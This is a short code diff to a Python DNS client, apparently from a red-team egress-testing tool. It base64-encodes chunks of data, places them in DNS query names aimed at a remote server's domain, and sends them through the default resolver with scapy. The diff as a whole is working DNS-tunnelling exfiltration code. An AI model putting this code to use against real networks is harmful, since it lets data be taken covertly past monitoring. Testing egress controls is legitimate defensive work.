@@ -10,6 +10,7 @@ default = dns.resolver.get_default_resolver()
 '''
 
 import base64
+import dns.resolver
 import socket
 import sys
 from common import helpers
@@ -28,8 +29,12 @@ class Client:
         byte_reader = 0
         packet_number = 1
 
+        resolver_object = dns.resolver.get_default_resolver()
+        nameserver = resolver_object.nameservers[0]
+
         while (byte_reader < len(data_to_transmit) + self.length):
             encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
+            encoded_data = encoded_data.replace("=", ".--")
 
             # calcalate total packets
             if ((len(data_to_transmit) % self.length) == 0):
@@ -41,8 +46,7 @@ class Client:
 
             # Craft the packet with scapy
             try:
-                print type(encoded_data + "." + self.remote_server)
-                request_packet = IP(dst="apple.veil-collective.com")/UDP()/DNS(
+                request_packet = IP(dst=nameserver)/UDP()/DNS(
                     qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="A")])
                 send(request_packet, iface='eth0')
             except socket.gaierror:
